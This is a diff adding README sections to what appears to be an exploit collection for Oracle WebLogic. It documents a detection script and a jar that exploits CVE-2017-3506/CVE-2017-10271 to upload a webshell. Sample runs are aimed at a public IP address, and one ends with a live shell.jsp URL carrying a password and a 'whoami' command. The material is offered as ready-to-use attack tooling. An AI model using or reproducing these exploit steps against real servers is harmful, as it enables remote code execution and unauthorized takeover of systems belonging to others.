@@ -74,3 +74,61 @@
 > EXP:
 > ![Image](https://github.com/zhzyker/exphub/blob/master/weblogic/image/cve-2014-4210_ssrf_redis_shell.png)
   
+## CVE-2017-3506_poc.py Weblogic wls-wsat远程命令执行漏洞检测脚本
+> VER:
+> ```
+> 10.3.6.0
+> 12.1.3.0
+> 12.2.1.0
+> 12.2.1.1
+> 12.2.1.2 
+> ```
+> USE:
+> ```
+> zhzy@debian:$ python cve-2017-3506_poc.py
+> +--------------------------------------------------------+
+> + USE: python cve-2017-3506_poc.py <url:port>            +
+> + VER: 10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1, 12.2.1.2  +
+> + EXP: python cve-2017-3506_poc.py 59.110.214.109:7001   +
+> +--------------------------------------------------------+
+> ```
+> EXP:
+> ```
+> zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7001
+> [+] CVE-2017-3506 Vulnerability
+> zhzy@debian:$ python cve-2017-3506_poc.py 59.110.214.109:7000
+> [-] No Vulnerability
+> ```
+
+## cve-2017-3506_webshell.jar Weblogic wls-wsat远程命令执行漏洞利用，上传Webshell
+> VER:
+> ```
+> 10.3.6.0
+> 12.1.3.0
+> 12.2.1.0
+> 12.2.1.1
+> 12.2.1.2 
+> ```
+> USE:
+> ```
+> zhzy@debian:$ java18  -jar cve-2017-10271_webshell.jar 
+> [*]              Oracle : WebLogic wls-wsat RCE Exp
+> [*]              CVE ID : CVE-2017-3506 & CVE-2017-10271
+> [*]  Vulnerability info : https://secfree.com/article-635.html
+> [*]              Author : Bearcat@secfree.com
+> [*]  Vulnerability page ：wls-wsat/CoordinatorPortType & wls-wsat/CoordinatorPortType11 
+> [*]               Usage ：java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx.xxx:7001 test.jsp
+> [*] Vulnerability patch : http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html
+> ```
+> EXP:
+> ```
+> zhzy@debian:/debian/archives-tool/web-weblogic$ java18  -jar cve-2017-10271_webshell.jar http://59.110.214.109:7007 > shell.jsp
+> [*] Starting exploit...
+> [*] Sending payloads...
+> [*] Payloads sent...
+> [*] Opening shell...
+> [*] pwned! Go ahead...
+> 
+> [+] http://59.110.214.109:7007/bea_wls_internal/shell.jsp?password=secfree&command=whoami
+> ```
+
